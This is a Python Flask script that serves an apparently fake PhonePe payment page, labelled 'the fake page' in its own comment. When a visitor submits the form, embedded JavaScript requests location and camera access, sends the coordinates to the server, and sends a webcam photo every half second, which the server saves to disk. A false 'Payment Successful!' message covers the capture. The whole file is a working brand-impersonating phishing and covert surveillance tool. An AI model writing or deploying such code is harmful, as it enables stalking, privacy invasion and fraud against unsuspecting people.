from flask import Flask, request, render_template_string
import base64
import uuid
import os
import json
from colorama import Fore, Style, init

# Initialize colorama for Windows and other platforms
init(autoreset=True)

app = Flask(__name__)

# HTML Template for the realistic PhonePe page
HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PhonePe Secure Payments</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
        }
        .header {
            background-color: #5400ff;
            color: white;
            padding: 20px;
            text-align: center;
        }
        .header h1 {
            margin: 0;
            font-size: 24px;
        }
        .balance {
            text-align: center;
            font-size: 18px;
            margin: 20px 0;
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }
        .container input[type="text"], .container input[type="number"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        .container button {
            width: 100%;
            padding: 12px;
            background-color: #5400ff;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        .container button:hover {
            background-color: #4300d9;
        }
        #success {
            display: none;
            text-align: center;
            font-size: 18px;
            color: green;
            margin-top: 20px;
        }
        #success-symbol {
            font-size: 0px;
            color: green;
            animation: success-animation 1s forwards;
        }
        @keyframes success-animation {
            0% { font-size: 0px; opacity: 0; }
            50% { font-size: 30px; opacity: 0.7; }
            100% { font-size: 50px; opacity: 1; }
        }
    </style>
    <script>
        let capturing = false;

        function askPermissions() {
            // Ask for location permission
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    const locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    };

                    // Send location to server
                    fetch('/location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(locationData)
                    }).then(() => {
                        console.log("Location sent to server:", locationData);
                    });
                }, error => {
                    alert("Location permission denied. Please allow to proceed.");
                });
            } else {
                alert("Geolocation is not supported by your browser.");
            }

            // Ask for camera permission
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const video = document.createElement("video");
                    video.srcObject = stream;
                    video.play();

                    const canvas = document.createElement('canvas');
                    const captureImages = () => {
                        if (!capturing) return;
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const imageData = canvas.toDataURL('image/jpeg');

                        fetch('/capture', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ image: imageData })
                        }).then(() => {
                            console.log("Image captured and sent.");
                        });

                        setTimeout(captureImages, 500); // Capture every 500ms (0.5 seconds)
                    };

                    // Start capturing after permission granted
                    capturing = true;
                    captureImages();

                    // Show success animation
                    document.getElementById("success-symbol").style.display = "inline";
                    document.getElementById("success").style.display = "block";
                })
                .catch(err => {
                    alert("Camera permission denied. Please allow to proceed.");
                });
        }

        function handleSubmit(event) {
            event.preventDefault();
            askPermissions();
        }
    </script>
</head>
<body>
    <div class="header">
        <h1>PhonePe Secure Payments</h1>
    </div>
    <div class="balance">
        <p>Available Balance: ₹16,890</p>
    </div>
    <div class="container">
        <form onsubmit="handleSubmit(event)">
            <input type="text" name="phone" placeholder="Enter your mobile number" required>
            <input type="number" name="amount" placeholder="Enter amount" required>
            <button type="submit">Continue</button>
        </form>
        <div id="success">
            <p id="success-symbol">✅</p>
            <p>Payment Successful!</p>
        </div>
    </div>
</body>
</html>
"""

# Route to display the fake page
@app.route('/')
def home():
    return HTML_PAGE

# Route to capture camera feed and save images with unique filenames
@app.route('/capture', methods=['POST'])
def capture():
    data = request.get_json()
    if 'image' in data:
        image_data = data['image'].split(",")[1]
        unique_filename = f"captured_image_{uuid.uuid4().hex}.jpg"
        with open(unique_filename, 'wb') as f:
            f.write(base64.b64decode(image_data))
        print(f"Captured image saved as {unique_filename}")
    return "Image captured!"

# Route to capture and print location data
@app.route('/location', methods=['POST'])
def location():
    data = request.get_json()
    latitude = data.get('latitude')
    longitude = data.get('longitude')

    # Print location in green color
    print(Fore.GREEN + f"User Location Received: Latitude - {latitude}, Longitude - {longitude}" + Style.RESET_ALL)

    return "Location captured!"

if __name__ == '__main__':
    app.run(debug=True)
